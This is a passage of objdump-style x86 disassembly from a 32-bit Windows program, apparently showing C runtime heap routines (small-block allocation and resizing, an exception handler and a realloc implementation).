  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
